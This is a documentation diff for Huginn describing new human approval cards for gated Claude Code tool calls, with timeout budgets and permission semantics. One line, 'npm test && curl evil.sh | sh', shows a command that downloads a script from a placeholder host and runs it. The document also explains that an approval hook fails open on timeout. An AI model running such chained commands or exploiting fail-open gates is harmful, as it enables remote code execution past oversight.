@@ -40,16 +40,19 @@ system_prompt: "You are Codey, a Claude Code session scoped to the Huginn repo."
 
 Note that `Bash`, `Write` and `Edit` appear in **both** lists. That is not a
 mistake and it is not redundant — it is the pattern you want for anything that
-actually needs to run. `claude_allowed_tools` is what the agent is *permitted*
-to do; `claude_gated_tools` is what takes a round-trip through Huginn and gets
-logged. A tool listed only under `claude_gated_tools` is denied every single
-time, with no prompt (see "How approval works" below), so this agent can read,
-search, run commands, write and edit — and every command, write and edit is
-recorded, while `Read`/`Glob`/`Grep` run without the round-trip.
+actually needs to run unattended. `claude_allowed_tools` is what the agent is
+*permitted* to do without asking anyone; `claude_gated_tools` is what takes a
+round-trip through Huginn and gets logged. A tool listed only under
+`claude_gated_tools` now raises an approval card in this agent's conversation
+and waits for a human (see "How approval works" below) instead of running
+silently, so this agent can read, search, run commands, write and edit — and
+every command, write and edit is recorded, while `Read`/`Glob`/`Grep` run
+without the round-trip.
 
 If you want a strictly read-only agent, drop `Bash`, `Write` and `Edit` from
-*both* lists rather than gating them: leaving them gated-but-not-allowed is
-just a slower way of saying no.
+*both* lists rather than gating them: leaving them gated-but-not-allowed now
+means every call to them stalls the agent for up to 285 seconds waiting for a
+click that will never come, rather than failing fast.
 
 Tool names are case-sensitive and matched exactly. `bash` (Huginn's own
 spelling) or `" Bash"` with a stray space matches nothing and silently grants
@@ -71,21 +74,38 @@ If you leave `claude_gated_tools` empty, the agent does **not** run ungated. An 
 Every turn, Huginn assembles the `claude` CLI invocation with two tool lists:
 
 - **Pre-authorised tools** (`claude_allowed_tools`) are passed via `--allowedTools`. Claude Code never asks about them — unless they are also gated, in which case the hook still fires (a `PreToolUse` hook runs before any permission check) and the answer is `allow`. That overlap is exactly how you get an audit trail without blocking the agent.
-- **Gated tools** (`claude_gated_tools`, or the restrictive default above if you left it empty) each get their own `PreToolUse` hook entry, registered inline via `--settings`. When Claude Code is about to run one of these, it invokes `huginn claude-approve`, which POSTs the tool call to `POST /api/v1/claude/approve` on your local Huginn server. That endpoint correlates the session ID back to the agent it belongs to, checks the tool name against `claude_allowed_tools`, and returns `allow` or `deny`.
+- **Gated tools** (`claude_gated_tools`, or the restrictive default above if you left it empty) each get their own `PreToolUse` hook entry, registered inline via `--settings`. When Claude Code is about to run one of these, it invokes `huginn claude-approve`, which POSTs the tool call to `POST /api/v1/claude/approve` on your local Huginn server. That endpoint correlates the session ID back to the agent it belongs to and checks the tool name against `claude_allowed_tools`: a hit returns `allow` immediately with no card; a miss raises an approval card and blocks on a human (see below) before returning `allow` or `deny`.
 
 Scoping matters here: a tool in **neither** list never calls Huginn at all, so if Huginn is down, only the gated tools are affected — the agent degrades to its ungated capability rather than stopping dead.
 
-Worth stating plainly: **`--allowedTools` and the hook produce the same effective permission set.** The approval endpoint allows exactly the tools in `claude_allowed_tools`, which is also what is passed to `--allowedTools`. The hook's contribution is a log entry and a human-readable deny reason, not additional restriction.
+So the two lists' actual semantics are: `claude_allowed_tools` is what the agent is permitted to do without asking anyone; `claude_gated_tools` is what triggers a hook round-trip and gets logged — and, if the tool isn't also pre-authorised, blocks on a human. Putting a tool in **both** lists is still the supported pattern for "let this run unattended, but I want an audit trail": the hook fires on every call and logs it, but the outcome is always `allow` immediately, with no card, because the tool is in `claude_allowed_tools`.
 
-**Say this plainly: there is no human in the loop.** `handleClaudeApprove` does not surface a pending request anywhere, notify anyone, or wait for a person to click anything — it only checks the tool name against `claude_allowed_tools` and returns `allow` or `deny` immediately. So the two lists' actual semantics are: `claude_allowed_tools` is what the agent is permitted to do; `claude_gated_tools` is what triggers a hook round-trip and gets logged. **A tool that is in `claude_gated_tools` but not in `claude_allowed_tools` is denied every single time.** There is no prompt, no queue, no notification, and no way to approve it in the moment — it simply never runs.
+**There is now a human in the loop for anything gated-but-not-allowed.** A tool call that is in `claude_gated_tools` but not `claude_allowed_tools` raises an approval card in that agent's conversation in the web UI (and a pending-count badge in the nav), and the tool call **blocks** — Claude Code does not proceed — until someone answers it or 285 seconds pass. No answer within that window is a deny, and the agent continues with the tool refused. Each pending request is its own card; a Huginn server restart clears every outstanding one outright rather than resolving it, since the underlying wait can't outlive the process (see "What happens across restarts" below).
 
-The one way a gated tool actually executes is to put it in **both** lists. Then the hook still fires on every call — so you get a log entry recording that it ran — but the outcome is always `allow`, because it's in `claude_allowed_tools`. This is the supported pattern for "let this run unattended, but I want an audit trail": put the tool in both `claude_allowed_tools` and `claude_gated_tools`, not just the first.
+**That wait holds the whole agent, not just the one call.** A `claude-code` agent's turn occupies its session for as long as a gated tool call is pending — up to the full 285 seconds — so that one agent is frozen mid-turn while a card is unanswered. Other agents, including other `claude-code` agents, are unaffected; only the agent whose tool call is pending stalls.
+
+**A human clicking Allow can now grant a tool that was never in `--allowedTools`.** Verified against the real CLI on 2026-08-27: with `--allowedTools` containing only `Read`, a hook returning `permissionDecision: "allow"` let a gated `Bash` command run, and `permission_denials` in the result came back empty. Before this work, `--allowedTools` and the hook always produced the same effective permission set — the hook could only confirm what the argv flag already allowed. That's no longer true: the hook is now a source of *additional* permission, not only of deny reasons and an audit trail.
+
+Two ways to answer a card carry memory, and both are one-way in this release:
+
+- **"Always allow this command"** — remembers the tool call by an exact, byte-for-byte match of the command string (only trailing whitespace is trimmed; no case-folding, no whitespace collapsing, no path canonicalisation). It applies to `Bash` only — `Write` and `Edit` carry different content on every call, so there's no stable string to key on, and the card doesn't offer this option for them. There is deliberately no prefix or pattern matching: treating `npm test` as a prefix would also authorise `npm test && curl evil.sh | sh`. The memory lasts **until the Huginn process restarts** — not the chat session, not the underlying Claude Code session — and is gone the moment `huginn serve` restarts.
+- **"Always allow this tool"** — writes the tool permanently into that agent's `claude_allowed_tools` and saves the agent config. From that point on the tool is never gated for that agent again: no card, no hook round-trip that could deny it, nothing. **This is the sharpest edge in the feature.** It is a privilege escalation performed by a single browser click, and in this release the *only* way to undo it is to hand-edit the agent's config file and remove the tool from the list — there is no undo button, no config-UI toggle, and no expiry.
 
 **Approval fails closed — and that rests on the hook process always printing a decision.** Claude Code's exit-code contract is narrow: exit `0` with a JSON decision on stdout blocks (or allows) as instructed, exit `2` blocks, and *every other exit code is a non-blocking error that lets the tool run*. A hook that crashes, can't find its binary, or dies on a corrupt config does not block anything. So `huginn claude-approve` is dispatched before Huginn loads config or parses flags, recovers from panics, and exits `2` if it somehow cannot print at all.
 
-If `huginn claude-approve` can't reach the Huginn server, gets a non-200 response, or can't parse the response, it prints an explicit `deny` and names the tool: *"Huginn unreachable — Bash requires approval."* Claude Code surfaces that reason to you verbatim and does not run the tool. There is no approval cache — every gated call is a fresh round-trip, because caching a security decision turns a boundary into a race.
+If `huginn claude-approve` can't reach the Huginn server, gets a non-200 response, or can't parse the response, it prints an explicit `deny` and names the tool: *"Huginn unreachable — Bash requires approval."* Claude Code surfaces that reason to you verbatim and does not run the tool. There is no approval cache beyond the two memories above — every other gated call is a fresh round-trip, because caching a security decision turns a boundary into a race.
 
-**A hook that times out is not the same as a hook that denies — and this is the part that makes the whole guarantee load-bearing.** Verified empirically against the real CLI: when Claude Code's own hook timeout fires, it kills the `huginn claude-approve` process and **runs the tool anyway** — the write went through, and `permission_denials` in the result came back empty. A `PreToolUse` hook fails *open* on timeout, not closed. Huginn's fail-closed guarantee therefore depends entirely on `huginn claude-approve`'s own client timeout (20 seconds) printing an explicit `deny` before Claude Code's hook timeout (30 seconds) gives up waiting and lets the tool through. These two numbers can never be tuned independently — there is a compile-time guard in the code (next to `claudeApproveTimeout` in `cmd_claude_approve.go`) that fails the build if the margin between them collapses. It is not decorative; it is the thing standing between "Huginn is unreachable" and "the tool ran without approval."
+**A hook that times out is not the same as a hook that denies — and this is the part that makes the whole guarantee load-bearing.** Verified empirically against the real CLI: when Claude Code's own hook timeout fires, it kills the `huginn claude-approve` process and **runs the tool anyway** — the write went through, and `permission_denials` in the result came back empty. A `PreToolUse` hook fails *open* on timeout, not closed. That single fact is why the three timeout budgets in this feature are ordered the way they are, tightest first:
+
+- **285s** — the approval store's own deadline. If nobody answers the card by then, the store itself returns `deny` and the wait ends.
+- **290s** — `huginn claude-approve`'s HTTP client timeout. If the store somehow never answers, the hook process gives up and prints `deny` itself before anyone else can.
+- **300s** — Claude Code's own hook timeout (`ClaudeHookTimeoutSecs`). This is the one Huginn cannot control: if the hook process is still running when this fires, Claude Code kills it and **runs the tool anyway**, fail-open.
+
+Each number leaves headroom before the next one fires, so Huginn always has an answer in hand — a real allow, a real deny, or the deadline's deny — before Claude Code's own timeout could take the decision out of Huginn's hands. These three numbers can never be tuned independently — there is a compile-time guard in the code (next to `claudeApproveTimeout` in `cmd_claude_approve.go`) that fails the build if the margin between the hook timeout and the client timeout collapses. It is not decorative; it is the thing standing between "Huginn is unreachable" and "the tool ran without approval."
+
+### What happens across restarts
+
+A pending approval lives only in memory, and that is deliberate rather than a limitation. The `claude` process backing a gated tool call is a child process of Huginn: if Huginn restarts, that child dies too, and the turn it was in the middle of no longer exists. A pending card describing that call would be describing something nobody can act on any more — persisting it would only resurrect a request with nothing left to answer. So a Huginn restart clears every pending approval outright; there is no recovery or replay on startup, and the web UI simply shows none until new ones arrive.
 
 ### Take over a session in a terminal
 
@@ -109,7 +129,9 @@ The tool calls Claude Code makes during a turn are recorded into Huginn's sessio
 
 ## Limitations
 
-**No interactive approval — a gated call is refused, not queued for a decision.** A tool in `claude_gated_tools` but not in `claude_allowed_tools` is denied automatically, every time, with no prompt, no notification, and nothing to click. Nothing in Huginn currently surfaces a pending Claude Code approval request to a person. If you want a gated tool to actually run, it has to also be in `claude_allowed_tools` — see "How approval works" above.
+**"Always allow this tool" has no undo in the UI.** Promoting a tool into an agent's `claude_allowed_tools` from an approval card is permanent and one-click; reversing it means hand-editing that agent's config file. There is no confirmation-then-revert flow and no way to see, from the web UI, which tools got promoted this way versus configured up front. See "How approval works" above.
+
+**A pending approval does not survive a Huginn restart.** This is correct, not a gap — the `claude` process behind the call is a child of Huginn and dies with it — but it does mean a card you were about to click can simply vanish out from under you if the server restarts first, with no history of it having existed.
 
 **Per-turn cost and token counts are dropped, and this is a Huginn gap, not a CLI one.** The `claude` CLI itself reports `CostUSD`, `NumTurns`, and `DurationMS` for every turn. Huginn's shared `backend.ChatResponse` type has no field to carry any of the three, so the numbers reach a debug log and nowhere else — not the chat UI, not history, not any spend report. The data exists at the source; the wall is on Huginn's side, and it's the first thing to widen if per-agent spend tracking is ever needed.
 
